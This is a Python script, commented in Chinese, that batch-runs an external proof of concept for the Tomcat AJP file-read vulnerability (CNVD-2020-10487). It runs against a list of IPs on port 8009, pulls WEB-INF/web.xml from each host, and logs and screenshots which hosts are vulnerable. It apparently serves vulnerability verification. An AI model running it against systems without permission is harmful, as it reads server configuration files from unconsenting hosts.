"""
虚拟环境请用conda安装（自行百度miniconda安装），因为POC用的python2，所以要建一个python2环境，一个python3环境
python2(POC运行环境)：
    conda create -n python2 python=python2.7
python3(本脚本运行环境):
    conda create -n biubiubiu python=python3.7
    pip install pywin32
    pip install pyqt
    pip install loguru
无法导入win32gui， 参考：https://stackoverflow.com/questions/3956178/cant-load-pywin32-library-win32gui
必须在cmd环境下运行，否则截图不正常！
usage：
    设置下面的TomcatLFI_path路径
    conda activate biubiubiu
    cd 到cmd.py所在文件夹目录
    python cmd.py
"""
import os, sys, subprocess, time
from loguru import logger
import win32gui
from PyQt5.QtWidgets import QApplication

# 记录日志
if not os.path.exists('log'):
    os.mkdir('log')
logger.add('./log/{time}.log', rotation='10 MB')

#  ！！！TomcatLFI.py的路径，必须按照本地环境重新设置！！！
TomcatLFI_path = r'G:\mega_sync\python\printScreen\TomcatLFI.py'
# 端口
port = '8009'
# 需要读取的文件名
file_name = 'WEB-INF/web.xml'
# 保存结果的文件
output_file_name = '{}.txt'.format(time.strftime('%Y%m%d%M%H%S'))


class get_all_hwnd_title:
    """
    用于获取句柄，仅供调试
    """
    def __init__(self):
        self.hwnd_title = dict()

        win32gui.EnumWindows(self.get_all_hwnd, 0)
        # 获取句柄和title
        for h, t in self.hwnd_title.items():
            if t is not "":
                print(h, t)

    def get_all_hwnd(self, hwnd, mouse):
        if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
            self.hwnd_title.update({hwnd: win32gui.GetWindowText(hwnd)})


def screen_shot(ip1, vuln1, num1=0):
    """:return 截取CMD当前状态图片，CMD不允许最小化，可以遮挡
    :param ip1(str): ip
    :param vuln1(bool): 用于判断是否有漏洞，有漏洞，截图保存为jpg格式，否则为png
    :param num1(str): 自增id值
    """
    # 截取CMD的图片并已ip名字保存
    # 根据标题找到句柄，找不到返回0
    hwnd = win32gui.FindWindow(None, 'C:\Windows\system32\cmd.exe - python  cmd.py')
    # get_all_hwnd_title()
    logger.info('{} 当前获取的窗口句柄为：{}'.format(ip1, hwnd))
    if hwnd != 0:
        app = QApplication(sys.argv)
        screen = QApplication.primaryScreen()
        img = screen.grabWindow(hwnd).toImage()
        if not os.path.exists('output'):
            os.mkdir('output')
        if vuln1:
            img_name = './output/{}-{}.jpg'.format(num1, ip1)
        else:
            img_name = './output/{}-{}.png'.format(num1, ip1)
        img.save(img_name)
        logger.info('{} 的图片保存成功！'.format(ip1))
    else:
        print('\t请确保当前在CMD环境下运行，否则无法准确截图！')
        logger.error('{} 截图失败！'.format(ip1))


def cmd(ip1, num1=0):
    """
    脚本主函数，先通过cmd执行漏洞验证，然后截图，保存结果
    :param ip1: ip
    :param num1: 自增id
    :return:
    """
    os.system('cls')  # CMD清屏
    d = subprocess.run(
        'conda activate python2 '
        '& python {path} {ip} -p {port} -f {file}'.format(path=TomcatLFI_path, ip=ip1, port=port, file=file_name),
        shell=True, stdout=subprocess.PIPE, encoding='utf-8')
    # 获取验证后的返回值并去除换行
    s = d.stdout.replace('\n', '')[:2000]
    logger.info('{} 的返回值：{}'.format(ip1, s))

    if 'Getting resource' in s:
        logger.warning('{} 存在漏洞 CNVD-2020-10487！'.format(ip1))
        out1 = '{}-{}-存在漏洞！\n'.format(num1, ip1)
        vuln = True
    else:
        logger.success('{} 不存在漏洞！\n'.format(ip1))
        out1 = '{}-{}-不存在漏洞'.format(num1, ip1)
        vuln = False

    time.sleep(3)  # 延时2s，否则截图异常
    screen_shot(ip1, vuln1=vuln, num1=num1)
    with open(output_file_name, 'a+') as f:
        f.write(out1)
    logger.info('{}-{}结果已保存至{}！'.format(num1, ip1, output_file_name))


def get_ip_from_txt(txt_path1):
    """
    批量读取文本的ip
    :param txt_path1:
    :return: ip的生成器：(自增id, ip)
    """
    with open('{}'.format(txt_path1), 'r', encoding='utf-8') as f:
        lines = f.readlines()
        for i, line in enumerate(lines):
            line = line.strip('\n')
            if line:
                yield (i, line)
            else:
                return


if __name__ == '__main__':
    # ip = '1.1.1.1'
    # cmd(ip)
    txt_path = 'ips.txt'
    ips = get_ip_from_txt(txt_path)
    for ip in ips:
        cmd(ip[1], ip[0])
    print('ok!')
